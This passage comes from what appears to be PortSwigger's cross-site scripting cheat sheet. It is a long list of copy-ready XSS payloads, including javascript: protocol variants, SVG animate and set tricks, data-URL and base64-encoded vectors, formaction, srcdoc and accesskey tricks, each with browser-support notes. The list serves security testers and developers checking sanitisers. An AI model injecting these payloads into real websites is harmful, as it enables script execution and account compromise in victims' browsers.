href=\"javascript:alert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22javascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#a-standard-javascript-protocol)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nThe protocol is not case sensitive\n\n[`<a href=\"JaVaScript:alert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22JaVaScript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#the-protocol-is-not-case-sensitive)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nCharacters \\\\x01-\\\\x20 are allowed before the protocol\n\n[`<a href=\" javascript:alert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22%20%09javascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#characters-x01x20-are-allowed-before-the-protocol)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nCharacters \\\\x09,\\\\x0a,\\\\x0d are allowed inside the protocol\n\n[`<a href=\"javas cript:alert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22javas%09cript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#characters-x09x0ax0d-are-allowed-inside-the-protocol)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nCharacters \\\\x09,\\\\x0a,\\\\x0d are allowed after protocol name before the colon\n\n[``` <a href=\"javascript :alert(1)\">XSS</a> ```](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22javascript%0A%3Aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#characters-x09x0ax0d-are-allowed-after-protocol-name-before-the-colon)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nXlink namespace inside SVG with JavaScript protocol\n\n[`<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Ca%20xlink%3Ahref%3D%22javascript%3Aalert%281%29%22%3E%3Ctext%20x%3D%2220%22%20y%3D%2220%22%3EXSS%3C%2Ftext%3E%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#xlink-namespace-inside-svg-with-javascript-protocol)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSVG animate tag using values\n\n[`<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Canimate%20xlink%3Ahref%3D%23xss%20attributeName%3Dhref%20values%3Djavascript%3Aalert%281%29%20%2F%3E%3Ca%20id%3Dxss%3E%3Ctext%20x%3D20%20y%3D20%3EXSS%3C%2Ftext%3E%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg-animate-tag-using-values)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSVG animate tag using to\n\n[`<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Canimate%20xlink%3Ahref%3D%23xss%20attributeName%3Dhref%20from%3Djavascript%3Aalert%281%29%20to%3D1%20%2F%3E%3Ca%20id%3Dxss%3E%3Ctext%20x%3D20%20y%3D20%3EXSS%3C%2Ftext%3E%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg-animate-tag-using-to)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSVG set tag\n\n[`<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cset%20xlink%3Ahref%3D%23xss%20attributeName%3Dhref%20from%3D%3F%20to%3Djavascript%3Aalert%281%29%20%2F%3E%3Ca%20id%3Dxss%3E%3Ctext%20x%3D20%20y%3D20%3EXSS%3C%2Ftext%3E%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg-set-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nData protocol inside script src\n\n[`<script src=\"data:text/javascript,alert(1)\"></script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%20src%3D%22data%3Atext%2Fjavascript%2Calert%281%29%22%3E%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#data-protocol-inside-script-src)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nSVG script href attribute without closing script tag\n\n[`<svg><script href=\"data:text/javascript,alert(1)\" />`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cscript%20href%3D%22data%3Atext%2Fjavascript%2Calert%281%29%22%20%2F%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg-script-href-attribute-without-closing-script-tag)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nSVG use element Chrome/Firefox\n\n[`<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x\"></use></svg>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cuse%20href%3D%22data%3Aimage%2Fsvg%2Bxml%2C%3Csvg%20id%3D%27x%27%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20xmlns%3Axlink%3D%27http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%27%20width%3D%27100%27%20height%3D%27100%27%3E%3Ca%20xlink%3Ahref%3D%27javascript%3Aalert%281%29%27%3E%3Crect%20x%3D%270%27%20y%3D%270%27%20width%3D%27100%27%20height%3D%27100%27%20%2F%3E%3C%2Fa%3E%3C%2Fsvg%3E%23x%22%3E%3C%2Fuse%3E%3C%2Fsvg%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg-use-element-chromefirefox)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nImport statement with data URL\n\n[`<script>import('data:text/javascript,alert(1)')</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Eimport%28%27data%3Atext%2Fjavascript%2Calert%281%29%27%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#import-statement-with-data-url)\n\n![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nBase tag with JavaScript protocol rewriting relative URLS\n\n[`<base href=\"javascript:/a/-alert(1)///////\"><a href=../lol/safari.html>test</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbase%20href%3D%22javascript%3A%2Fa%2F-alert%281%29%2F%2F%2F%2F%2F%2F%2F%22%3E%3Ca%20href%3D..%2Flol%2Fsafari.html%3Etest%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#base-tag-with-javascript-protocol-rewriting-relative-urls)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nMathML makes any tag clickable\n\n[`<math><x href=\"javascript:alert(1)\">blah`](https://portswigger-labs.net/xss/xss.php?x=%3Cmath%3E%3Cx%20href%3D%22javascript%3Aalert%281%29%22%3Eblah&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#mathml-makes-any-tag-clickable)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nButton and formaction\n\n[`<form><button formaction=javascript:alert(1)>XSS`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cbutton%20formaction%3Djavascript%3Aalert%281%29%3EXSS&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#button-and-formaction)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nInput and formaction\n\n[`<form><input type=submit formaction=javascript:alert(1) value=XSS>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cinput%20type%3Dsubmit%20formaction%3Djavascript%3Aalert%281%29%20value%3DXSS%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#input-and-formaction)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nForm and action\n\n[`<form action=javascript:alert(1)><input type=submit value=XSS>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%20action%3Djavascript%3Aalert%281%29%3E%3Cinput%20type%3Dsubmit%20value%3DXSS%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#form-and-action)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nAnimate tag with keytimes and multiple values\n\n[`<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values=\"https://portswigger.net?&semi;javascript:alert(1)&semi;0\" /><a id=xss><text x=20 y=20>XSS</text></a>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Canimate%20xlink%3Ahref%3D%23xss%20attributeName%3Dhref%20dur%3D5s%20repeatCount%3Dindefinite%20keytimes%3D0%3B0%3B1%20values%3D%22https%3A%2F%2Fportswigger.net%3F%26semi%3Bjavascript%3Aalert%281%29%26semi%3B0%22%20%2F%3E%3Ca%20id%3Dxss%3E%3Ctext%20x%3D20%20y%3D20%3EXSS%3C%2Ftext%3E%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#animate-tag-with-keytimes-and-multiple-values)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nJavaScript protocol with new line\n\n[`<a href=\"javascript://%0aalert(1)\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22javascript%3A%2F%2F%250aalert%281%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#javascript-protocol-with-new-line)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nData URL with use element and base64 encoded\n\n[`<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x\" /></svg>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cuse%20href%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8%2BCjwvc3ZnPg%3D%3D%23x%22%20%2F%3E%3C%2Fsvg%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#data-url-with-use-element-and-base64-encoded)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nData URL with use element\n\n[`<svg><use href=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" />`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Cuse%20href%3D%22data%3Aimage%2Fsvg%2Bxml%2C%26lt%3Bsvg%20id%3D%27x%27%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%26gt%3B%26lt%3Bimage%20href%3D%271%27%20onerror%3D%27alert%281%29%27%20%2F%26gt%3B%26lt%3B%2Fsvg%26gt%3B%23x%22%20%2F%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#data-url-with-use-element)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nAnimate tag with auto executing use element\n\n[`<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" /><use id=x />`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Canimate%20xlink%3Ahref%3D%22%23x%22%20attributeName%3D%22href%22%20values%3D%22data%3Aimage%2Fsvg%2Bxml%2C%26lt%3Bsvg%20id%3D%27x%27%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%26gt%3B%26lt%3Bimage%20href%3D%271%27%20onerror%3D%27alert%281%29%27%20%2F%26gt%3B%26lt%3B%2Fsvg%26gt%3B%23x%22%20%2F%3E%3Cuse%20id%3Dx%20%2F%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#animate-tag-with-auto-executing-use-element)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg)\n\nEmbed supports code attribute\n\n[`<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>`](https://portswigger-labs.net/xss/xss.php?x=%3Cembed%20code%3Dhttps%3A%2F%2Fportswigger-labs.net%20width%3D500%20height%3D500%20type%3Dtext%2Fhtml%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#embed-supports-code-attribute)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg)\n\nObject tag supports param url\n\n[`<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>`](https://portswigger-labs.net/xss/xss.php?x=%3Cobject%20width%3D500%20height%3D500%20type%3Dtext%2Fhtml%3E%3Cparam%20name%3Durl%20value%3Dhttps%3A%2F%2Fportswigger-labs.net%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#object-tag-supports-param-url)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg)\n\nObject tag supports param code\n\n[`<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>`](https://portswigger-labs.net/xss/xss.php?x=%3Cobject%20width%3D500%20height%3D500%20type%3Dtext%2Fhtml%3E%3Cparam%20name%3Dcode%20value%3Dhttps%3A%2F%2Fportswigger-labs.net%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#object-tag-supports-param-code)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg)\n\nObject tag supports param movie\n\n[`<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>`](https://portswigger-labs.net/xss/xss.php?x=%3Cobject%20width%3D500%20height%3D500%20type%3Dtext%2Fhtml%3E%3Cparam%20name%3Dmovie%20value%3Dhttps%3A%2F%2Fportswigger-labs.net%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#object-tag-supports-param-movie)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg)\n\nObject tag supports param src\n\n[`<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>`](https://portswigger-labs.net/xss/xss.php?x=%3Cobject%20width%3D500%20height%3D500%20type%3Dtext%2Fhtml%3E%3Cparam%20name%3Dsrc%20value%3Dhttps%3A%2F%2Fportswigger-labs.net%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#object-tag-supports-param-src)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nAssignable protocol with location\n\n[`<script>location.protocol='javascript'</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Elocation.protocol=%27javascript%27;%3C/script%3E#%0aalert%281%29//&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nAssignable protocol with anchor\n\n[`<a href=\"%0aalert(1)\" onclick=\"protocol='javascript'\">test</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%22%250aalert%281%29%22%20onclick%3D%22protocol%3D%27javascript%27%22%3Etest%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-anchor)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg)\n\nNavigation navigate method\n\n[`<script>navigation.navigate('javascript:alert(1)')</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Enavigation.navigate%28%27javascript%3Aalert%281%29%27%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#navigation-navigate-method)\n\nOther useful attributes\n-----------------------\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUsing srcdoc attribute\n\n[`<iframe srcdoc=\"<img src=1 onerror=alert(1)>\"></iframe>`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20srcdoc%3D%22%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#using-srcdoc-attribute)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nUsing srcdoc with entities\n\n[`<iframe srcdoc=\"&lt;img src=1 onerror=alert(1)&gt;\"></iframe>`](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20srcdoc%3D%22%26lt%3Bimg%20src%3D1%20onerror%3Dalert%281%29%26gt%3B%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#using-srcdoc-with-entities)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nClick a submit element from anywhere on the page, even outside the form\n\n[`<form action=\"javascript:alert(1)\"><input type=submit id=x></form><label for=x>XSS</label>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%20action%3D%22javascript%3Aalert%281%29%22%3E%3Cinput%20type%3Dsubmit%20id%3Dx%3E%3C%2Fform%3E%3Clabel%20for%3Dx%3EXSS%3C%2Flabel%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#click-a-submit-element-from-anywhere-on-the-page-even-outside-the-form)\n\n![Works in Firefox](/web-security/images/browser-logos/firefox.svg)\n\nHidden inputs: Access key attributes can enable XSS on normally unexploitable elements\n\n[`<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)`](https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20type%3D%22hidden%22%20accesskey%3D%22X%22%20onclick%3D%22alert%281%29%22%3E%20%28Press%20ALT%2BSHIFT%2BX%20on%20Windows%29%20%28CTRL%2BALT%2BX%20on%20OS%20X%29&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#hidden-inputs-access-key-attributes-can-enable-xss-on-normally-unexploitable-elements)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg)\n\nLink elements: Access key attributes can enable XSS on normally unexploitable elements\n\n[`<link rel=\"canonical\" accesskey=\"X\" onclick=\"alert(1)\" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)`](https://portswigger-labs.net/xss/xss.php?x=%3Clink%20rel%3D%22canonical%22%20accesskey%3D%22X%22%20onclick%3D%22alert%281%29%22%20%2F%3E%20%28Press%20ALT%2BSHIFT%2BX%20on%20Windows%29%20%28CTRL%2BALT%2BX%20on%20OS%20X%29&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#link-elements-access-key-attributes-can-enable-xss-on-normally-unexploitable-elements)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nDownload attribute can save a copy of the current webpage\n\n[`<a href=# download=\"filename.html\">Test</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%23%20download%3D%22filename.html%22%3ETest%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#download-attribute-can-save-a-copy-of-the-current-webpage)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nDisable referrer using referrerpolicy\n\n[`<img referrerpolicy=\"no-referrer\" src=\"//portswigger-labs.net\">`](https://portswigger-labs.net/xss/xss.php?x=%3Cimg%20referrerpolicy%3D%22no-referrer%22%20src%3D%22%2F%2Fportswigger-labs.net%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#disable-referrer-using-referrerpolicy)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSet window.name via parameter on the window.open function\n\n[`<a href=# onclick=\"window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')\">XSS</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%23%20onclick%3D%22window.open%28%27http%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fxss%2Fxss.php%3Fcontext%3Djs_string_single%26x%3D%2527%3Beval%28name%29%2F%2F%27%2C%27alert%281%29%27%29%22%3EXSS%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#set-windowname-via-parameter-on-the-windowopen-function)\n\n![Works in Chrome](/web-security/images/browser-logos/chrome.svg) ![Works in Firefox](/web-security/images/browser-logos/firefox.svg) ![Works in Safari](/web-security/images/browser-logos/safari.svg)\n\nSet window.name via name attribute in a <iframe\\> tag\n\n[`<iframe name=\"alert(1)\" 